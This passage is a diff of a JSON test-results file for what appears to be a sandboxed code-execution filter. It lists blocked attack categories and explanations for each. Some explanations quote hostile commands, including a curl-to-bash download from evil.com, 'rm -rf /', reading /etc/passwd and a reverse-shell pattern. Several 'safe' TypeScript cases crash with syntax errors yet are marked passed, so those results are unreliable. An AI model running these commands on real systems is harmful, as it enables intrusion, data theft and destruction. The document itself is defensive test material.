       "explanation": "\n      🎯 ATTACK: Typed Environment Variable Access\n      \n      How hackers use this:\n      Creating typed interfaces for process.env allows extracting\n      all environment variables in a structured format.\n      \n      Real-world impact:\n      - Steal all environment variables at once\n      - JSON.stringify for easy exfiltration\n      - AWS keys, database passwords, API tokens\n    "
     },
     {
@@ -897,7 +897,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 30,
       "explanation": "\n      🎯 ATTACK: Structured System Information Gathering\n      \n      How hackers use this:\n      Collecting system information in typed objects creates a clean\n      fingerprint of the target system.\n      \n      Real-world impact:\n      - System reconnaissance for targeted attacks\n      - Identify high-value targets\n      - Build system profiles for exploitation\n    "
     },
     {
@@ -908,7 +908,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 44,
       "explanation": "\n      🎯 ATTACK: Type Assertion for Filter Evasion\n      \n      How hackers use this:\n      TypeScript type assertions (as const, as string) are compile-time only.\n      They can make code look different while producing identical runtime behavior.\n      \n      Real-world impact:\n      - Bypass AST-based analyzers that don't understand TS\n      - Make static analysis harder\n      - Runtime behavior unchanged\n    "
     },
     {
@@ -919,7 +919,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 6,
+      "duration": 143,
       "explanation": "\n      🎯 ATTACK: Using 'any' to Hide Dangerous Operations\n      \n      How hackers use this:\n      The 'any' type disables TypeScript's type checking, allowing\n      any value to pass through without compile-time errors.\n      \n      Real-world impact:\n      - Bypass TypeScript's safety guarantees\n      - Dynamic module loading without type errors\n      - Makes code harder to analyze statically\n    "
     },
     {
@@ -930,7 +930,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 47,
       "explanation": "\n      🎯 ATTACK: Generic Functions for Module Loading\n      \n      How hackers use this:\n      Generics allow writing functions that can return any type,\n      making dangerous module access look like type-safe utilities.\n      \n      Real-world impact:\n      - Type-safe wrapper around require()\n      - Reusable attack code\n      - Harder to identify malicious intent\n    "
     },
     {
@@ -941,7 +941,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 4,
+      "duration": 63,
       "explanation": "\n      🎯 ATTACK: Decorator-based Code Execution\n      \n      How hackers use this:\n      TypeScript decorators execute at class definition time.\n      A malicious decorator runs code just by decorating a class.\n      \n      Real-world impact:\n      - Execute code when module loads\n      - Hide execution in decorator functions\n      - Common in legitimate frameworks (easier to hide malware)\n    "
     },
     {
@@ -952,7 +952,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 15,
       "explanation": "\n      🎯 ATTACK: Method Decorator for File Access\n      \n      How hackers use this:\n      Method decorators execute when the class is defined, not when\n      the method is called. This allows early code execution.\n      \n      Real-world impact:\n      - Execute before main code runs\n      - Read files at import/definition time\n      - Decorator pattern is common, less suspicious\n    "
     },
     {
@@ -963,7 +963,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 22,
       "explanation": "\n      🎯 ATTACK: Index Signature for Dynamic Access\n      \n      How hackers use this:\n      TypeScript index signatures allow any string as a property key.\n      Combined with string concatenation, this bypasses static analysis.\n      \n      Real-world impact:\n      - Access blocked properties dynamically\n      - Index signature defeats type-based security\n      - Runtime behavior identical to JavaScript\n    "
     },
     {
@@ -974,7 +974,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 24,
       "explanation": "\n      🎯 ATTACK: Type-Safe Eval Wrapper\n      \n      How hackers use this:\n      Wrapping eval in a typed function doesn't make it safe.\n      The type assertion is stripped at compile time.\n      \n      Real-world impact:\n      - \"safeEval\" name is deceptive\n      - Type assertions don't validate or sanitize\n      - Same security issues as raw eval\n    "
     },
     {
@@ -985,7 +985,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 12,
       "explanation": "\n      🎯 ATTACK: Typed Function Constructor\n      \n      How hackers use this:\n      The Function constructor creates functions from strings (like eval).\n      Adding types doesn't change this dangerous behavior.\n      \n      Real-world impact:\n      - Dynamic code execution with type safety theater\n      - Often missed by TypeScript-aware analyzers\n      - Type assertion masks the danger\n    "
     },
     {
@@ -996,7 +996,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 53,
       "explanation": "\n      🎯 ATTACK: Typed Prototype Pollution\n      \n      How hackers use this:\n      TypeScript allows modifying Object.prototype through type assertions.\n      The pollution affects all objects at runtime.\n      \n      Real-world impact:\n      - Same as JavaScript prototype pollution\n      - Interface makes the pollution look intentional\n      - Type system doesn't prevent prototype modification\n    "
     },
     {
@@ -1007,7 +1007,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 4,
       "explanation": "\n      🎯 ATTACK: Namespace-Encapsulated Malware\n      \n      How hackers use this:\n      TypeScript namespaces organize code but don't provide isolation.\n      Malicious code inside a namespace runs normally.\n      \n      Real-world impact:\n      - Organize malware in namespaces\n      - Look like legitimate utility libraries\n      - Namespace doesn't sandbox code\n    "
     },
     {
@@ -1018,7 +1018,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 7,
       "explanation": "\n      🎯 ATTACK: Module Declaration with Usage\n      \n      How hackers use this:\n      Module augmentation looks like type declarations but includes\n      actual imports and usage of dangerous modules.\n      \n      Real-world impact:\n      - Declare and use dangerous modules together\n      - Looks like type definition file\n      - Real import and execution occurs\n    "
     },
     {
@@ -1029,7 +1029,7 @@
       "expectBlocked": false,
       "passed": true,
       "executed": true,
-      "duration": 72,
+      "duration": 200,
       "explanation": "\n      ✅ SAFE: Typed Mathematical Function\n      \n      This is legitimate code that should NOT be blocked:\n      Type-annotated functions performing safe operations\n      are exactly what TypeScript is designed for.\n      \n      Note: Actual execution requires TypeScript transpilation,\n      which is a runtime concern separate from security filtering.\n    ",
       "stdout": "",
       "stderr": "(node:55) ExperimentalWarning: Permission is an experimental feature and might change at any time\n(Use `node --trace-warnings ...` to show where the warning was created)\nfile:///app/sandbox/webide-1/[eval1]:1\nconst add = (a: number, b: number): number => a + b; console.log(add(2, 3));\n              ^\n\nSyntaxError: Unexpected token ':'\n    at compileSourceTextModule (node:internal/modules/esm/utils:346:16)\n    at ModuleLoader.eval (node:internal/modules/esm/loader:241:18)\n    at node:internal/process/execution:68:24\n    at asyncRunEntryPointWithESMLoader (node:internal/modules/run_main:117:11)\n    at Object.runEntryPointWithESMLoader (node:internal/modules/run_main:141:19)\n    at evalModuleEntryPoint (node:internal/process/execution:67:47)\n    at node:internal/main/eval_string:30:3\n\nNode.js v20.19.6",
@@ -1043,7 +1043,7 @@
       "expectBlocked": false,
       "passed": true,
       "executed": true,
-      "duration": 74,
+      "duration": 345,
       "explanation": "\n      ✅ SAFE: Interface-Based Data Structures\n      \n      This is legitimate code that should NOT be blocked:\n      Defining and using interfaces for type safety is\n      core TypeScript functionality.\n    ",
       "stdout": "",
       "stderr": "(node:61) ExperimentalWarning: Permission is an experimental feature and might change at any time\n(Use `node --trace-warnings ...` to show where the warning was created)\nfile:///app/sandbox/webide-1/[eval1]:1\ninterface Point { x: number; y: number; }\n^^^^^^^^^\n\nSyntaxError: Unexpected strict mode reserved word\n    at compileSourceTextModule (node:internal/modules/esm/utils:346:16)\n    at ModuleLoader.eval (node:internal/modules/esm/loader:241:18)\n    at node:internal/process/execution:68:24\n    at asyncRunEntryPointWithESMLoader (node:internal/modules/run_main:117:11)\n    at Object.runEntryPointWithESMLoader (node:internal/modules/run_main:141:19)\n    at evalModuleEntryPoint (node:internal/process/execution:67:47)\n    at node:internal/main/eval_string:30:3\n\nNode.js v20.19.6",
@@ -1057,7 +1057,7 @@
       "expectBlocked": false,
       "passed": true,
       "executed": true,
-      "duration": 96,
+      "duration": 443,
       "explanation": "\n      ✅ SAFE: Generic Identity Function\n      \n      This is legitimate code that should NOT be blocked:\n      Generics without dangerous operations are safe\n      and fundamental to TypeScript development.\n    ",
       "stdout": "",
       "stderr": "(node:67) ExperimentalWarning: Permission is an experimental feature and might change at any time\n(Use `node --trace-warnings ...` to show where the warning was created)\nfile:///app/sandbox/webide-1/[eval1]:1\nfunction identity<T>(value: T): T { return value; }\n                 ^\n\nSyntaxError: Unexpected token '<'\n    at compileSourceTextModule (node:internal/modules/esm/utils:346:16)\n    at ModuleLoader.eval (node:internal/modules/esm/loader:241:18)\n    at node:internal/process/execution:68:24\n    at asyncRunEntryPointWithESMLoader (node:internal/modules/run_main:117:11)\n    at Object.runEntryPointWithESMLoader (node:internal/modules/run_main:141:19)\n    at evalModuleEntryPoint (node:internal/process/execution:67:47)\n    at node:internal/main/eval_string:30:3\n\nNode.js v20.19.6",
@@ -1071,7 +1071,7 @@
       "expectBlocked": false,
       "passed": true,
       "executed": true,
-      "duration": 71,
+      "duration": 177,
       "explanation": "\n      ✅ SAFE: Class with Typed Methods\n      \n      This is legitimate code that should NOT be blocked:\n      Object-oriented TypeScript with proper typing\n      is standard practice for application development.\n    ",
       "stdout": "",
       "stderr": "(node:73) ExperimentalWarning: Permission is an experimental feature and might change at any time\n(Use `node --trace-warnings ...` to show where the warning was created)\nfile:///app/sandbox/webide-1/[eval1]:2\n  add(a: number, b: number): number { return a + b; }\n       ^\n\nSyntaxError: Unexpected token ':'\n    at compileSourceTextModule (node:internal/modules/esm/utils:346:16)\n    at ModuleLoader.eval (node:internal/modules/esm/loader:241:18)\n    at node:internal/process/execution:68:24\n    at asyncRunEntryPointWithESMLoader (node:internal/modules/run_main:117:11)\n    at Object.runEntryPointWithESMLoader (node:internal/modules/run_main:141:19)\n    at evalModuleEntryPoint (node:internal/process/execution:67:47)\n    at node:internal/main/eval_string:30:3\n\nNode.js v20.19.6",
@@ -1085,7 +1085,7 @@
       "expectBlocked": false,
       "passed": true,
       "executed": true,
-      "duration": 110,
+      "duration": 133,
       "explanation": "\n      ✅ SAFE: Enum Definition and Usage\n      \n      This is legitimate code that should NOT be blocked:\n      Enums are a TypeScript feature for defining\n      named constants. Completely safe.\n    ",
       "stdout": "",
       "stderr": "(node:79) ExperimentalWarning: Permission is an experimental feature and might change at any time\n(Use `node --trace-warnings ...` to show where the warning was created)\nfile:///app/sandbox/webide-1/[eval1]:1\nenum Color { Red, Green, Blue }\n^^^^\n\nSyntaxError: Unexpected reserved word\n    at compileSourceTextModule (node:internal/modules/esm/utils:346:16)\n    at ModuleLoader.eval (node:internal/modules/esm/loader:241:18)\n    at node:internal/process/execution:68:24\n    at asyncRunEntryPointWithESMLoader (node:internal/modules/run_main:117:11)\n    at Object.runEntryPointWithESMLoader (node:internal/modules/run_main:141:19)\n    at evalModuleEntryPoint (node:internal/process/execution:67:47)\n    at node:internal/main/eval_string:30:3\n\nNode.js v20.19.6",
@@ -1099,7 +1099,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 5,
+      "duration": 12,
       "explanation": "\n      🎯 ATTACK: Direct Shell Command Execution\n      \n      How hackers use this:\n      os.system() passes a command to the shell for execution.\n      It's the simplest way to run arbitrary commands in Python.\n      \n      Real-world impact:\n      - Execute any shell command with server privileges\n      - Download and run malware: os.system('curl evil.com/mal.sh | bash')\n      - Delete files: os.system('rm -rf /')\n      - Modify system configuration\n      \n      Historical note:\n      This is one of the most common Python RCE vectors, found in\n      countless CVEs and security incidents.\n    "
     },
     {
@@ -1110,7 +1110,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 7,
+      "duration": 10,
       "explanation": "\n      🎯 ATTACK: Command Execution with Output Capture\n      \n      How hackers use this:\n      os.popen() runs a command and returns its output as a file object.\n      Attackers use this to capture command results for exfiltration.\n      \n      Real-world impact:\n      - Run 'cat /etc/passwd' and capture the output\n      - List directories to find valuable files\n      - Execute commands and process their output programmatically\n    "
     },
     {
@@ -1121,7 +1121,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 5,
+      "duration": 9,
       "explanation": "\n      🎯 ATTACK: Process Replacement via exec Family\n      \n      How hackers use this:\n      os.exec* functions replace the current process with a new one.\n      This is useful for running binaries directly without shell.\n      \n      Real-world impact:\n      - Replace Python process with shell\n      - Execute binaries without shell overhead\n      - Harder to trace because process is replaced entirely\n    "
     },
     {
@@ -1132,7 +1132,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 6,
+      "duration": 9,
       "explanation": "\n      🎯 ATTACK: Process Spawning\n      \n      How hackers use this:\n      os.spawn* functions create new processes to execute programs.\n      They offer more control than system() and popen().\n      \n      Real-world impact:\n      - Spawn persistent processes (backdoors)\n      - Execute binaries with specific arguments\n      - Control process execution mode (wait/nowait)\n    "
     },
     {
@@ -1143,7 +1143,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 4,
+      "duration": 6,
       "explanation": "\n      🎯 ATTACK: Modern Subprocess Execution\n      \n      How hackers use this:\n      subprocess is the recommended way to spawn processes in modern Python.\n      It provides full control over stdin/stdout/stderr.\n      \n      Real-world impact:\n      - Execute any system command\n      - Capture and process output\n      - Chain commands together\n      - Most flexible command execution API\n    "
     },
     {
@@ -1154,7 +1154,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 5,
+      "duration": 6,
       "explanation": "\n      🎯 ATTACK: Interactive Process Control\n      \n      How hackers use this:\n      Popen provides low-level process control with pipes for communication.\n      The shell=True parameter enables shell command interpretation.\n      \n      Real-world impact:\n      - Create interactive shells\n      - Pipe data between processes\n      - Long-running backdoor processes\n      \n      Security note:\n      shell=True is especially dangerous as it enables shell metacharacters\n    "
     },
     {
@@ -1165,7 +1165,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 7,
       "explanation": "\n      🎯 ATTACK: Simple Command Call\n      \n      How hackers use this:\n      subprocess.call() is a simplified interface for running commands.\n      Returns the exit code of the executed command.\n      \n      Real-world impact:\n      - Quick command execution\n      - Check if commands succeed\n      - Often used in automated attack scripts\n    "
     },
     {
@@ -1176,7 +1176,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 5,
+      "duration": 4,
       "explanation": "\n      🎯 ATTACK: Command Output Capture\n      \n      How hackers use this:\n      check_output() runs a command and returns its output as bytes.\n      Raises an exception if the command fails.\n      \n      Real-world impact:\n      - Reliable output capture for data theft\n      - Error handling built-in\n      - Common in data exfiltration scripts\n    "
     },
     {
@@ -1187,7 +1187,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 8,
       "explanation": "\n      🎯 ATTACK: Legacy Command Execution\n      \n      How hackers use this:\n      The commands module is deprecated but may exist in older systems.\n      Attackers try multiple methods to increase success chances.\n      \n      Real-world impact:\n      - Works on older Python 2.x systems\n      - Part of comprehensive attack toolkit\n      - Legacy code may still use this\n    "
     },
     {
@@ -1198,7 +1198,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 4,
       "explanation": "\n      🎯 ATTACK: Dynamic Code Execution via exec()\n      \n      How hackers use this:\n      exec() executes arbitrary Python code from a string.\n      Combined with obfuscation, it's a powerful attack vector.\n      \n      Real-world impact:\n      - Execute obfuscated malicious code\n      - Bypass static analysis\n      - Multi-stage attacks (exec downloads and runs payload)\n      \n      Common pattern:\n      exec(base64.decode(obfuscated_payload))\n    "
     },
     {
@@ -1209,7 +1209,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 8,
+      "duration": 14,
       "explanation": "\n      🎯 ATTACK: Expression Evaluation with __import__\n      \n      How hackers use this:\n      eval() evaluates a Python expression. Combined with __import__(),\n      it can import modules and call their functions.\n      \n      Real-world impact:\n      - Single-expression RCE\n      - Often found in template injection vulnerabilities\n      - Common in SSTI (Server-Side Template Injection)\n    "
     },
     {
@@ -1220,7 +1220,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 4,
+      "duration": 3,
       "explanation": "\n      🎯 ATTACK: Compile and Execute Code\n      \n      How hackers use this:\n      compile() creates code objects that can be executed later.\n      This separates code creation from execution, evading some filters.\n      \n      Real-world impact:\n      - Two-stage code execution\n      - Code object inspection/modification\n      - Bypass exec() blocking by using compile()\n    "
     },
     {
@@ -1253,7 +1253,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 5,
+      "duration": 6,
       "explanation": "\n      🎯 ATTACK: Direct File Reading\n      \n      How hackers use this:\n      The built-in open() function provides unrestricted file access.\n      Attackers use it to read sensitive files.\n      \n      Real-world impact:\n      - Read /etc/passwd for user enumeration\n      - Access application source code\n      - Read configuration files with credentials\n      - Access SSH keys and certificates\n      \n      Why blocked:\n      In a sandboxed code execution environment, file access should\n      be completely disabled to prevent information disclosure.\n    "
     },
     {
@@ -1264,7 +1264,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 6,
       "explanation": "\n      🎯 ATTACK: Writing Malicious Files\n      \n      How hackers use this:\n      Writing files enables persistent attacks - creating backdoors,\n      modifying application code, or planting malware.\n      \n      Real-world impact:\n      - Create web shells for persistent access\n      - Modify Python scripts to inject backdoors\n      - Write cron jobs for scheduled attacks\n      - Plant SSH keys for future access\n    "
     },
     {
@@ -1275,7 +1275,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 4,
+      "duration": 7,
       "explanation": "\n      🎯 ATTACK: File System Reconnaissance\n      \n      How hackers use this:\n      os.path functions reveal information about the file system\n      without directly reading files.\n      \n      Real-world impact:\n      - Check if sensitive files exist\n      - Map directory structure\n      - Find writable locations\n      - Identify valuable targets\n    "
     },
     {
@@ -1286,7 +1286,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 5,
       "explanation": "\n      🎯 ATTACK: Directory Listing\n      \n      How hackers use this:\n      os.listdir() reveals directory contents, helping attackers\n      understand the system and find targets.\n      \n      Real-world impact:\n      - Enumerate files in sensitive directories\n      - Find configuration files\n      - Discover application structure\n      - Locate backup files with credentials\n    "
     },
     {
@@ -1297,7 +1297,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 5,
       "explanation": "\n      🎯 ATTACK: Modern Path Library File Access\n      \n      How hackers use this:\n      pathlib is the modern, object-oriented path library.\n      read_text() and read_bytes() provide easy file access.\n      \n      Real-world impact:\n      - Same as open(), different API\n      - May bypass filters only checking 'open'\n      - Cleaner syntax for file operations\n    "
     },
     {
@@ -1308,7 +1308,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 5,
+      "duration": 9,
       "explanation": "\n      🎯 ATTACK: File Copy/Move Operations\n      \n      How hackers use this:\n      shutil provides high-level file operations like copy, move,\n      and recursive directory operations.\n      \n      Real-world impact:\n      - Copy sensitive files to accessible locations\n      - Move files to disrupt applications\n      - Recursive directory copying for mass theft\n    "
     },
     {
@@ -1319,7 +1319,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 5,
       "explanation": "\n      🎯 ATTACK: File Input Iterator\n      \n      How hackers use this:\n      fileinput module iterates over files, often overlooked\n      in security filters.\n      \n      Real-world impact:\n      - Alternative file reading method\n      - Process multiple files at once\n      - In-place file modification\n    "
     },
     {
@@ -1330,7 +1330,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 5,
+      "duration": 8,
       "explanation": "\n      🎯 ATTACK: IO Module File Access\n      \n      How hackers use this:\n      io.open() is the same as built-in open() but explicitly\n      from the io module. May bypass naive filters.\n      \n      Real-world impact:\n      - Alternative to open()\n      - Binary and text mode support\n      - Buffer control for large files\n    "
     },
     {
@@ -1341,7 +1341,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 4,
+      "duration": 6,
       "explanation": "\n      🎯 ATTACK: Raw Socket Connection (Reverse Shell)\n      \n      How hackers use this:\n      socket module enables raw network connections. The most common\n      use is creating reverse shells.\n      \n      Real-world impact:\n      - Reverse shell: socket connects to attacker, sends shell I/O\n      - Data exfiltration over custom protocols\n      - Port scanning and network reconnaissance\n      \n      Classic pattern:\n      socket.connect(attacker) → os.dup2(socket, stdin/stdout) → exec('/bin/sh')\n    "
     },
     {
@@ -1352,7 +1352,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 6,
+      "duration": 10,
       "explanation": "\n      🎯 ATTACK: HTTP Data Exfiltration\n      \n      How hackers use this:\n      urllib provides HTTP client functionality for fetching URLs\n      or sending data to external servers.\n      \n      Real-world impact:\n      - Download malware payloads\n      - Exfiltrate stolen data via HTTP\n      - Beacon to C2 servers\n      - SSRF (Server-Side Request Forgery) attacks\n    "
     },
     {
@@ -1363,7 +1363,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 6,
       "explanation": "\n      🎯 ATTACK: Low-Level HTTP Client\n      \n      How hackers use this:\n      http.client provides fine-grained HTTP control.\n      Useful for crafted requests and custom protocols.\n      \n      Real-world impact:\n      - Send custom HTTP requests\n      - Exfiltrate data in HTTP headers\n      - HTTP smuggling attacks\n    "
     },
     {
@@ -1374,7 +1374,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 4,
+      "duration": 5,
       "explanation": "\n      🎯 ATTACK: FTP File Transfer\n      \n      How hackers use this:\n      FTP can be used to upload stolen files or download\n      malware from attacker servers.\n      \n      Real-world impact:\n      - Exfiltrate files via FTP\n      - Download additional tools\n      - Traditional protocol may bypass web filters\n    "
     },
     {
@@ -1385,7 +1385,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 4,
+      "duration": 9,
       "explanation": "\n      🎯 ATTACK: Email-Based Exfiltration\n      \n      How hackers use this:\n      smtplib can send emails containing stolen data.\n      Email often bypasses network monitoring.\n      \n      Real-world impact:\n      - Email credentials and secrets to attacker\n      - Use server as spam relay\n      - Covert data exfiltration channel\n    "
     },
     {
@@ -1396,7 +1396,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 4,
+      "duration": 5,
       "explanation": "\n      🎯 ATTACK: HTTP Requests Library\n      \n      How hackers use this:\n      requests is the most popular HTTP library in Python.\n      Simple API for exfiltrating data.\n      \n      Real-world impact:\n      - JSON payload exfiltration\n      - Easy API interaction\n      - Cookie/session handling for authenticated requests\n    "
     },
     {
@@ -1407,7 +1407,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 8,
       "explanation": "\n      🎯 ATTACK: Environment Variable Theft\n      \n      How hackers use this:\n      os.environ contains all environment variables, often including\n      sensitive configuration and credentials.\n      \n      Real-world impact:\n      - Steal API keys (AWS_SECRET_ACCESS_KEY, etc.)\n      - Get database passwords\n      - Find JWT secrets\n      - Access cloud credentials\n    "
     },
     {
@@ -1418,7 +1418,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 6,
       "explanation": "\n      🎯 ATTACK: Path Information Disclosure\n      \n      How hackers use this:\n      Knowing the working directory helps attackers understand\n      the application structure and plan further attacks.\n      \n      Real-world impact:\n      - Reveal server paths\n      - Aid in path traversal attacks\n      - Information gathering\n    "
     },
     {
@@ -1429,7 +1429,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 5,
+      "duration": 13,
       "explanation": "\n      🎯 ATTACK: System Fingerprinting\n      \n      How hackers use this:\n      platform module reveals OS details useful for\n      selecting targeted exploits.\n      \n      Real-world impact:\n      - Identify OS for targeted attacks\n      - Find kernel version for exploits\n      - System architecture detection\n    "
     },
     {
@@ -1440,7 +1440,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 8,
       "explanation": "\n      🎯 ATTACK: Denial of Service\n      \n      How hackers use this:\n      sys.exit() terminates the process, causing service disruption.\n      \n      Real-world impact:\n      - Crash the application\n      - Disrupt service for users\n      - Cover tracks by terminating before logging\n    "
     },
     {
@@ -1451,7 +1451,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 4,
+      "duration": 10,
       "explanation": "\n      🎯 ATTACK: User Information Gathering\n      \n      How hackers use this:\n      getpass reveals the current user, useful for targeted\n      attacks and privilege enumeration.\n      \n      Real-world impact:\n      - Identify running user\n      - Target specific user directories\n      - Aid in privilege escalation\n    "
     },
     {
@@ -1462,7 +1462,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 11,
       "explanation": "\n      🎯 ATTACK: Native Code Loading\n      \n      How hackers use this:\n      ctypes allows loading shared libraries and calling C functions,\n      bypassing Python's safety mechanisms.\n      \n      Real-world impact:\n      - Load malicious shared libraries\n      - Call system functions directly\n      - Bypass Python sandboxing entirely\n      - Memory manipulation\n    "
     },
     {
@@ -1473,7 +1473,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 5,
       "explanation": "\n      🎯 ATTACK: Process Spawning for Persistence\n      \n      How hackers use this:\n      multiprocessing creates child processes that survive\n      parent termination.\n      \n      Real-world impact:\n      - Spawn persistent backdoors\n      - Fork bomb for DoS\n      - Parallel attacks\n    "
     },
     {
@@ -1484,7 +1484,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 6,
       "explanation": "\n      🎯 ATTACK: Background Thread Execution\n      \n      How hackers use this:\n      Threads run concurrently, potentially executing malicious\n      code in the background.\n      \n      Real-world impact:\n      - Background malware execution\n      - Evade single-threaded monitoring\n      - Parallel data processing\n    "
     },
     {
@@ -1495,7 +1495,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 6,
       "explanation": "\n      🎯 ATTACK: Pickle Deserialization RCE\n      \n      How hackers use this:\n      pickle can execute arbitrary code during deserialization.\n      Malicious pickle payloads achieve RCE when unpickled.\n      \n      Real-world impact:\n      - Classic Python deserialization vulnerability\n      - The payload shown executes os.system('id')\n      - Common in web apps accepting pickled data\n      \n      Warning:\n      NEVER unpickle data from untrusted sources!\n    "
     },
     {
@@ -1517,7 +1517,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 5,
+      "duration": 6,
       "explanation": "\n      🎯 ATTACK: Shelve Persistent Objects\n      \n      How hackers use this:\n      shelve uses pickle internally, inheriting its vulnerabilities.\n      Creates persistent storage that could contain malicious objects.\n      \n      Real-world impact:\n      - Persistent pickle storage\n      - Same RCE risks as pickle\n      - File-based attack persistence\n    "
     },
     {
@@ -1528,7 +1528,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 4,
+      "duration": 11,
       "explanation": "\n      🎯 ATTACK: Base64 Encoded Payload\n      \n      How hackers use this:\n      Base64 encoding hides malicious code from simple filters.\n      The encoded string decodes to: import os; os.system('id')\n      \n      Real-world impact:\n      - Bypass pattern-based filters\n      - Hide payload in seemingly random strings\n      - Standard malware obfuscation technique\n    "
     },
     {
@@ -1539,7 +1539,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 7,
       "explanation": "\n      🎯 ATTACK: Character Code Obfuscation\n      \n      How hackers use this:\n      Building strings from chr() codes hides keywords from filters.\n      chr(105),chr(109)... spells 'import'.\n      \n      Real-world impact:\n      - Bypass keyword filters\n      - Each character as a number\n      - Common in CTF exploits\n    "
     },
     {
@@ -1550,7 +1550,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 4,
       "explanation": "\n      🎯 ATTACK: Hex Encoded Payload\n      \n      How hackers use this:\n      Hex encoding is an alternative to base64 for hiding code.\n      '696d706f7274206f73' = 'import os'\n      \n      Real-world impact:\n      - Alternative to base64\n      - Bypasses base64-specific filters\n      - Less suspicious than base64 strings\n    "
     },
     {
@@ -1561,7 +1561,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 5,
       "explanation": "\n      🎯 ATTACK: ROT13/Codec Obfuscation\n      \n      How hackers use this:\n      codecs module supports various encodings including rot_13.\n      'vzcbeg bf' in rot_13 is 'import os'.\n      \n      Real-world impact:\n      - Multiple encoding options\n      - rot_13 is simple letter substitution\n      - Can chain multiple encodings\n    "
     },
     {
@@ -1572,7 +1572,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 3,
+      "duration": 10,
       "explanation": "\n      🎯 ATTACK: Compressed Payload\n      \n      How hackers use this:\n      Compression hides code and reduces payload size.\n      The compressed data decompresses to malicious code.\n      \n      Real-world impact:\n      - Smaller payload for injection\n      - Harder to detect patterns\n      - Binary data looks like garbage\n    "
     },
     {
@@ -1583,7 +1583,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 5,
       "explanation": "\n      🎯 ATTACK: Global Namespace Access\n      \n      How hackers use this:\n      globals() returns the global symbol table, exposing imported\n      modules and functions.\n      \n      Real-world impact:\n      - Discover available modules\n      - Access __builtins__ for dangerous functions\n      - Find application secrets in globals\n    "
     },
     {
@@ -1594,7 +1594,7 @@
       "expectBlocked": true,
       "passed": true,
       "blocked": true,
-      "duration": 2,
+      "duration": 10,
